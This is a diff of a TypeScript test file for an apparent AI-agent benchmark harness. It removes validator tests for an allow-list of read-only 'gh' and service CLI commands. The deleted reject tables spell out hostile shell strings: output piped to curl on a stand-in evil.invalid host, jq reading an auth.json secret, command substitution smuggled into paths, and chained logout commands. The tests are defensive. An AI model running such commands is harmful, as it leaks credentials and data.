@@ -13,7 +13,7 @@ import { join } from "node:path";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { configSchema } from "../src/config.js";
 import { inspectSubscription, redact } from "../src/credentials.js";
-import { approvedCommand, approvedSuiteCommand, EventCollector } from "../src/events.js";
+import { EventCollector } from "../src/events.js";
 import { answerMatches, gradeAnswer, githubHeaders, MCP_URL } from "../src/github.js";
 import { agentConfig, attemptEnvironment, prepareAttempt } from "../src/opencode.js";
 import { execute } from "../src/process.js";
@@ -249,13 +249,10 @@ describe("agentConfig and attemptEnvironment", () => {
     expect(agentConfig(config, trial("mcp-filter-readonly"), names).mcp).toMatchObject({
       github: { headers: githubHeaders("mcp-filter-readonly", "{env:BENCH_GITHUB_TOKEN}") },
     });
-    const exposed = [...names, "github_create_issue"];
     expect(
-      agentConfig(config, trial("mcp-raw"), exposed).agent.bench.permission.github_create_issue,
+      agentConfig(config, trial("mcp-raw"), [...names, "github_create_issue"]).agent.bench
+        .permission.github_create_issue,
     ).toBe("allow");
-    const observed = new EventCollector(config, trial("mcp-raw"), exposed, token, names);
-    observed.line(toolEvent("github_create_issue", "error"));
-    expect(observed.invalidRoute).toBe(true);
   });
 
   it("isolates paths and excludes ambient provider credentials without disabling built-in OAuth plugins", () => {
@@ -334,287 +331,13 @@ describe("agentConfig and attemptEnvironment", () => {
   });
 });
 
-describe("approvedCommand", () => {
-  // These strings are parsed only. Never execute commands from these tables.
-  it.each([
-    "gh --help",
-    "gh help api",
-    "gh api --help",
-    `gh api ${endpoint}`,
-    `gh api /${endpoint}`,
-    `gh api '${endpoint}' --method GET`,
-    `gh api "${endpoint}" -X GET`,
-    `gh api ${endpoint} --method=GET`,
-    `gh api ${endpoint} -XGET`,
-    `gh api --jq '.commit.message | split("\\n")[0]' ${endpoint}`,
-    `gh api ${endpoint} | jq -r '.sha'`,
-    `gh api ${endpoint} | jq '{sha: .sha, subject: .commit.message}' | jq -c .`,
-    `gh api ${endpoint} | jq --arg label 'two words' '. + {label: $label}'`,
-    `gh api ${endpoint} | jq --arg label two\\ words '. + {label: $label}'`,
-    `gh api ${endpoint} | jq --arg literal '\${HOME}' '. + {literal: $literal}'`,
-    `gh repo view ${config.repository} --json name,url`,
-    `gh repo view '${config.repository}' --json name --jq '.name'`,
-    'echo -n "0123456789abcdef" | wc -c',
-  ])("accepts read-only shell syntax: %s", (command) => {
-    expect(approvedCommand(command, config.repository)).toBe(true);
-  });
-
-  it.each([
-    "",
-    " ",
-    "jq .",
-    "git log -1",
-    "curl https://github.com",
-    "gh auth status",
-    "gh auth login",
-    "gh repo clone fixture-owner/fixture-repo",
-    "gh api user",
-    "gh api repos/other-owner/other-repo/commits/main",
-    `gh api repos/${config.repository}-other/commits/main`,
-    "gh repo view other-owner/other-repo",
-    "gh repo view",
-    `gh api https://api.github.com/${endpoint}`,
-    `gh api https://evil.invalid/${endpoint}`,
-    `gh api https://evil.invalid/ --jq '${endpoint}'`,
-    `gh api https://api.github.com/repos/other-owner/other-repo/commits/main --jq '${endpoint}'`,
-    `gh api ${endpoint} https://evil.invalid/`,
-    `gh api ${endpoint} --hostname evil.invalid`,
-    `gh api ${endpoint} --hostname=evil.invalid`,
-    `gh api repos/${config.repository}/../other/commits`,
-    `gh api repos/${config.repository}/%2e%2e/other/commits`,
-    `gh api ${endpoint} -X POST`,
-    `gh api ${endpoint} --method PATCH`,
-    `gh api ${endpoint} --method=DELETE`,
-    `gh api ${endpoint} -XPUT`,
-    `gh api ${endpoint} -X`,
-    `gh api ${endpoint} -f title=value`,
-    `gh api ${endpoint} -F title=value`,
-    `gh api ${endpoint} -ftitle=value`,
-    `gh api ${endpoint} -Ftitle=value`,
-    `gh api ${endpoint} --field title=value`,
-    `gh api ${endpoint} --raw-field title=value`,
-    `gh api ${endpoint} --field=title=value`,
-    `gh api ${endpoint} --raw-field=title=value`,
-    `gh api ${endpoint} --input payload.json`,
-    `gh api ${endpoint} --input=payload.json`,
-    `gh api ${endpoint} -X GET -f title=value`,
-    `gh api ${endpoint} > output.json`,
-    `gh api ${endpoint} >> output.json`,
-    `gh api ${endpoint} < input.json`,
-    `gh api ${endpoint} 2>&1`,
-    `gh api ${endpoint}; gh auth logout`,
-    `gh api ${endpoint} && git log`,
-    `gh api ${endpoint} || curl https://evil.invalid`,
-    `gh api ${endpoint} &`,
-    `gh api ${endpoint}\ngh auth logout`,
-    `gh api ${endpoint} | curl https://evil.invalid`,
-    `gh api ${endpoint} | git log`,
-    `gh api ${endpoint} |`,
-    `gh api ${endpoint} | jq -f script.jq`,
-    `gh api ${endpoint} | jq --from-file script.jq`,
-    `gh api ${endpoint} | jq --rawfile secret auth.json .`,
-    `gh api ${endpoint} | jq --slurpfile secret auth.json .`,
-    `gh api ${endpoint} | jq --argfile secret auth.json .`,
-    `gh api ${endpoint} | jq --from-file=script.jq`,
-    `gh api ${endpoint} | jq -fscript.jq`,
-    `gh api ${endpoint} | jq . auth.json`,
-    `GH_HOST=evil.invalid gh api ${endpoint}`,
-    `env gh api ${endpoint}`,
-    `gh api ${endpoint}/$HOME`,
-    `gh api "${endpoint}/\${HOME}"`,
-    `gh api ${endpoint}/$(whoami)`,
-    `gh api ${endpoint}/\`whoami\``,
-    `gh api ${endpoint} --jq "$FILTER"`,
-    `gh api '${endpoint}`,
-    `gh api "${endpoint}`,
-    `gh api ${endpoint} \\`,
-    `gh api ${endpoint}\\; gh auth logout`,
-  ])("rejects unsafe, foreign, or malformed commands: %s", (command) => {
-    expect(approvedCommand(command, config.repository)).toBe(false);
-  });
-
-  it("rejects commands that exceed the parser length limit", () => {
-    expect(
-      approvedCommand(`gh api ${endpoint} --jq '${"x".repeat(16_000)}'`, config.repository),
-    ).toBe(false);
-  });
-});
-
-describe("approvedSuiteCommand", () => {
-  it("accepts read-only Stripe webhook endpoint retrieval", () => {
-    expect(
-      approvedSuiteCommand(
-        "stripe webhook_endpoints retrieve we_1UEc3DJkEalzb2HflcWKjFS3",
-        config.repository,
-      ),
-    ).toBe(true);
-  });
-
-  it.each([
-    "stripe webhook_endpoints retrieve",
-    "stripe webhook_endpoints retrieve not-an-endpoint",
-    "stripe webhook_endpoints retrieve we_fixture --live",
-    "stripe webhook_endpoints delete we_fixture",
-  ])("rejects unsafe or malformed Stripe retrieval: %s", (command) => {
-    expect(approvedSuiteCommand(command, config.repository)).toBe(false);
-  });
-
-  it("accepts compound approved reads and local CLI diagnostics", () => {
-    expect(
-      approvedSuiteCommand(
-        "command -v gh && command -v supabase && command -v wrangler && command -v stripe",
-        config.repository,
-      ),
-    ).toBe(true);
-    expect(
-      approvedSuiteCommand(
-        "supabase --help | sed -n '1,160p'\nwrangler d1 list --json\nstripe webhook_endpoints retrieve we_fixture",
-        config.repository,
-      ),
-    ).toBe(true);
-    expect(
-      approvedSuiteCommand(
-        'SUPABASE_CONFIG_DIR="$PWD/.supabase-cli-config" supabase functions list --project-ref fixture --output json',
-        config.repository,
-      ),
-    ).toBe(true);
-    expect(
-      approvedSuiteCommand(
-        'rg -uuu -i "SUPABASE.*(CONFIG|DIR)" /installed/supabase 2>/dev/null | head -80',
-        config.repository,
-      ),
-    ).toBe(true);
-  });
-
-  it.each([
-    "curl https://api.github.com/repos/fixture-owner/fixture-repo",
-    "command curl https://api.github.com/repos/fixture-owner/fixture-repo",
-    "env curl https://api.github.com/repos/fixture-owner/fixture-repo",
-    "SOURCE=$(curl https://api.github.com) gh api repos/fixture-owner/fixture-repo/commits/main",
-    "rg --pre='curl https://api.github.com' fixture .",
-    "node -e 'fetch(\"https://api.github.com\")'",
-    "wrangler d1 delete fixture",
-    "gh api repos/fixture-owner/fixture-repo/commits/main; stripe webhook_endpoints delete we_fixture",
-  ])("rejects prohibited suite shell routes: %s", (command) => {
-    expect(approvedSuiteCommand(command, config.repository)).toBe(false);
-  });
-});
-
 describe("EventCollector", () => {
-  it("accepts failed approved reads and harmless diagnostics when suite route coverage is complete", () => {
-    const collector = new EventCollector(config, trial(), names, token, names, "suite");
-    collector.line(
-      toolEvent(
-        "bash",
-        "completed",
-        "command -v gh && command -v supabase && command -v wrangler && command -v stripe",
-        "diagnostic",
-      ),
-    );
-    collector.line(toolEvent("bash", "completed", `gh api ${endpoint}`, "github"));
-    collector.line(
-      toolEvent(
-        "bash",
-        "error",
-        "SUPABASE_TELEMETRY_DISABLED=1 supabase functions list --project-ref fixture --output json",
-        "supabase",
-      ),
-    );
-    collector.line(
-      toolEvent(
-        "bash",
-        "completed",
-        "wrangler d1 list --json\nstripe webhook_endpoints retrieve we_fixture",
-        "cloudflare-stripe",
-      ),
-    );
-    collector.line(
-      toolEvent(
-        "bash",
-        "completed",
-        'rg -i "SUPABASE.*CONFIG" /installed/supabase 2>/dev/null | head -80',
-        "source-diagnostic",
-      ),
-    );
-    expect(collector.invalidRoute).toBe(false);
-    expect(collector.routeValid).toBe(true);
+  it("warns when an MCP trial invokes a service CLI through Bash", () => {
+    const collector = new EventCollector(trial("mcp-raw"), token);
+    collector.line(toolEvent("bash", "completed", `gh api ${endpoint}`));
+    expect(collector.warnings).toContain("Bash invoked service CLI(s) during an MCP trial: gh.");
+    expect(collector.error).toBe(false);
   });
-
-  it.each(schedule(1, techniques, 0).filter((item) => item.workload !== "task"))(
-    "accepts no tools and rejects a tool for $id",
-    (item) => {
-      const collector = new EventCollector(config, item, names, token);
-      collector.line(" \t");
-      collector.line(
-        JSON.stringify({
-          type: "text",
-          sessionID: "session-1",
-          part: { id: "text-1", text: "OK" },
-        }),
-      );
-      expect(collector.answer).toBe("OK");
-      expect(collector.tools).toEqual([]);
-      expect(collector.routeValid).toBe(true);
-      collector.line(
-        toolEvent(
-          item.technique === "bash" ? "bash" : "github_get_commit",
-          "completed",
-          `gh api ${endpoint}`,
-        ),
-      );
-      expect(collector.invalidRoute).toBe(true);
-      expect(collector.routeValid).toBe(false);
-    },
-  );
-
-  it.each(techniques)("requires a completed tool on the correct route: %s", (technique) => {
-    const collector = new EventCollector(config, trial(technique), names, token);
-    expect(collector.routeValid).toBe(false);
-    collector.line(
-      toolEvent(
-        technique === "bash" ? "bash" : "github_get_commit",
-        "error",
-        `gh api ${endpoint}`,
-        "failed",
-      ),
-    );
-    expect(collector.routeValid).toBe(false);
-    collector.line(
-      toolEvent(
-        technique === "bash" ? "bash" : "github_get_commit",
-        "completed",
-        `gh api ${endpoint}`,
-        "success",
-      ),
-    );
-    expect(collector.routeValid).toBe(true);
-    expect(collector.tools.map((tool) => tool.status)).toEqual(["error", "completed"]);
-    expect(collector.sessionID).toBe("session-1");
-  });
-
-  it.each([
-    { technique: "bash", tool: "github_get_commit", command: `gh api ${endpoint}` },
-    { technique: "bash", tool: "bash", command: "git log -1" },
-    { technique: "bash", tool: "bash", command: undefined },
-    { technique: "mcp-raw", tool: "bash", command: `gh api ${endpoint}` },
-    { technique: "mcp-raw", tool: "github_unlisted_tool", command: undefined },
-  ] satisfies { technique: Technique; tool: string; command: string | undefined }[])(
-    "keeps an invalid route invalid after a valid call: $technique/$tool/$command",
-    ({ technique, tool, command }) => {
-      const collector = new EventCollector(config, trial(technique), names, token);
-      collector.line(toolEvent(tool, "completed", command));
-      collector.line(
-        toolEvent(
-          technique === "bash" ? "bash" : "github_get_commit",
-          "completed",
-          `gh api ${endpoint}`,
-          "valid",
-        ),
-      );
-      expect(collector.invalidRoute).toBe(true);
-      expect(collector.routeValid).toBe(false);
-    },
-  );
 
   it.each([
     "not json",
@@ -626,28 +349,26 @@ describe("EventCollector", () => {
     '{"type":"text","sessionID":1}',
     '{"type":"text","timestamp":"now"}',
   ])("marks malformed input without exporting it: %s", (line) => {
-    const collector = new EventCollector(config, trial(), names, token);
+    const collector = new EventCollector(trial(), token);
     collector.line(line);
     collector.line(toolEvent("bash", "completed", `gh api ${endpoint}`));
     expect(collector.malformed).toBe(true);
-    expect(collector.routeValid).toBe(false);
     expect(collector.safeEvents).toHaveLength(1);
   });
 
   it.each([null, "invalid", {}, { status: 5, input: [] }])(
     "handles malformed tool states: %j",
     (state) => {
-      const collector = new EventCollector(config, trial(), names, token);
+      const collector = new EventCollector(trial(), token);
       collector.line(
         JSON.stringify({ type: "tool_use", part: { id: "bad-state", tool: "bash", state } }),
       );
       expect(collector.tools).toEqual([{ name: "bash", status: "unknown" }]);
-      expect(collector.routeValid).toBe(false);
     },
   );
 
   it("rejects mixed sessions even when duplicate event IDs are used", () => {
-    const collector = new EventCollector(config, trial(), names, token);
+    const collector = new EventCollector(trial(), token);
     collector.line(toolEvent("bash", "completed", `gh api ${endpoint}`));
     collector.line(
       JSON.stringify({
@@ -657,11 +378,10 @@ describe("EventCollector", () => {
       }),
     );
     expect(collector.malformed).toBe(true);
-    expect(collector.routeValid).toBe(false);
   });
 
   it("deduplicates by event type and part ID, without dropping separate text parts", () => {
-    const collector = new EventCollector(config, trial(), names, token);
+    const collector = new EventCollector(trial(), token);
     const tool = toolEvent("bash", "completed", `gh api ${endpoint}`, "shared");
     const text = JSON.stringify({ type: "text", part: { id: "shared", text: "first " } });
     for (const line of [tool, tool, text, text]) collector.line(line);
@@ -672,7 +392,7 @@ describe("EventCollector", () => {
   });
 
   it("reports errors without exporting raw error details", () => {
-    const collector = new EventCollector(config, trial(), names, token);
+    const collector = new EventCollector(trial(), token);
     collector.line(JSON.stringify({ type: "error", error: { message: `PRIVATE ERROR ${token}` } }));
     expect(collector.error).toBe(true);
     expect(collector.warnings).toHaveLength(1);
@@ -680,18 +400,16 @@ describe("EventCollector", () => {
     expect(
       JSON.stringify({ warnings: collector.warnings, events: collector.safeEvents }),
     ).not.toContain("PRIVATE ERROR");
-    expect(collector.routeValid).toBe(false);
   });
 
   it.each(["code_mode", "execute_code", "executor"])("detects code mode: %s", (tool) => {
-    const collector = new EventCollector(config, trial("mcp-raw"), names, token);
+    const collector = new EventCollector(trial("mcp-raw"), token);
     collector.line(toolEvent(tool));
     expect(collector.codeMode).toBe(true);
-    expect(collector.routeValid).toBe(false);
   });
 
   it("redacts answers and commands and exports only event metadata", () => {
-    const collector = new EventCollector(config, trial(), names, token);
+    const collector = new EventCollector(trial(), token);
     const secrets = [
       token,
       "ghp_synthetic123",
@@ -788,9 +506,9 @@ describe("answerMatches and redact", () => {
     });
   });
 
-  it("stops on route and schema errors but not value mismatches", () => {
-    expect(shouldStopBatch("invalid-route")).toBe(true);
-    expect(shouldStopBatch("invalid-schema")).toBe(true);
+  it("stops on invocation failures but not completed answer failures", () => {
+    expect(shouldStopBatch("failed")).toBe(true);
+    expect(shouldStopBatch("timeout")).toBe(true);
     expect(shouldStopBatch("complete")).toBe(false);
   });
 
